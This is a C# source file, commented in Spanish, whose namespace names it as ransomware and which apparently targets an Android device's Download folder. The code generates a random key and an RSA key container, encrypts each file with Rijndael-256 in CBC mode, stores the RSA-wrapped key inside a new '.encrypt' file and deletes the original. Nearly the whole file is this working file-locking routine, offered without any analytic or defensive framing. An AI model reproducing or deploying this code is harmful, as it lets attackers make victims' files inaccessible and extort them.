using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;

namespace Ransomware.EncryptFiles
{
    public static class Encrypt
    {
        /// <summary>
        /// https://docs.microsoft.com/en-us/dotnet/standard/security/walkthrough-creating-a-cryptographic-application
        /// utilizando este algoritmo de cifrado base se fue modificando lo necesario para adaptarlo.
        /// </summary>
        public static readonly int resCod = 1000;
        static CspParameters cspp = new CspParameters();
        static RSACryptoServiceProvider rsa;
        const string PathDownload = @"sdcard/Download/";

        /// <summary>
        /// Metodo publico estatico el cual recibe la URI del archivo 
        /// utilizando el algoritmo Rinjndael, que nos permitira 
        /// cifrar los archivos con nuestra clave ya creada
        /// </summary>
        public static void EncryptFile(string inFile)
        {
            RijndaelManaged rjndl = new RijndaelManaged();
            rjndl.KeySize = 256;
            rjndl.BlockSize = 256;
            rjndl.Mode = CipherMode.CBC;
            ICryptoTransform transform = rjndl.CreateEncryptor();

            byte[] keyEncrypted = rsa.Encrypt(rjndl.Key, false);

            byte[] LenK = new byte[4];
            byte[] LenIV = new byte[4];

            int lKey = keyEncrypted.Length;
            LenK = BitConverter.GetBytes(lKey);
            int lIV = rjndl.IV.Length;
            LenIV = BitConverter.GetBytes(lIV);


            string outfile = inFile.Substring(0, inFile.LastIndexOf(".")) + ".encrypt";

            using (FileStream outFs = new FileStream(outfile, FileMode.Create))
            {
                outFs.Write(LenK, 0, 4);
                outFs.Write(LenIV, 0, 4);
                outFs.Write(keyEncrypted, 0, lKey);
                outFs.Write(rjndl.IV, 0, lIV);


                using (CryptoStream outStreamEncrypted = new CryptoStream(outFs, transform, CryptoStreamMode.Write))
                {
                    int count = 0;
                    int offset = 0;

                    int blockSizeBytes = rjndl.BlockSize / 8;
                    byte[] data = new byte[blockSizeBytes];
                    int bytesRead = 0;


                    using (FileStream inFS = new FileStream(inFile, FileMode.Open))
                    {
                        do
                        {
                            count = inFS.Read(data, 0, blockSizeBytes);
                            offset += count;
                            outStreamEncrypted.Write(data, 0, count);
                            bytesRead += blockSizeBytes;
                        } while (count > 0);
                        inFS.Close();
                    }
                    outStreamEncrypted.FlushFinalBlock();
                    outStreamEncrypted.Close();
                }

                outFs.Close();
            }
            deleteFile(inFile);
        }
        /// <summary>
        /// Este metodo es para crear la clave de cifrado
        /// la clave es aleatoria por cada vez que cifra los datos.
        /// consiste en crear una clave RSA del MD5 de la clave ingresada
        /// </summary>
        public static string CreateKey()
        {
            string k = key(20);
            string clv = GetMD5(k);
            cspp.KeyContainerName = clv;
            rsa = new RSACryptoServiceProvider(cspp);
            rsa.PersistKeyInCsp = true;
            return k;
        }

        private static string GetMD5(string str)
        {
            MD5CryptoServiceProvider md5 = new MD5CryptoServiceProvider();
            ASCIIEncoding encoding = new ASCIIEncoding();

            byte[] stream = null;
            StringBuilder sb = new StringBuilder();

            stream = md5.ComputeHash(encoding.GetBytes(str));

            for (int i = 0; i < stream.Length; i++)

                sb.AppendFormat("{0:x2}", stream[i]);
            return sb.ToString();

        }
        /// <summary>
        /// Creacion de una clave aleatoria de cierta longitud 
        /// contiene un string con todos los caracteres que puede utilizar en la contraseña
        /// </summary>
        private static string key(int longitud)
        {
            string caracteres = "abcdefghijklmnñopqrstuvwxyzABCDEFGHIJKLMNÑOPQRSTUVWXYZ1234567890=!¡¿?[{+}]°|;:.,_-";
            StringBuilder res = new StringBuilder();
            Random rnd = new Random();
            while (0 < longitud--)
            {
                res.Append(caracteres[rnd.Next(caracteres.Length)]);
            }
            return res.ToString();
        }
        /// <summary>
        /// Verifica si el archivo existe y lo elimina
        /// </summary>
        private static void deleteFile(string pathFile)
        {
            if (File.Exists(pathFile))
            {
                File.Delete(pathFile);
            }
        }
    }
}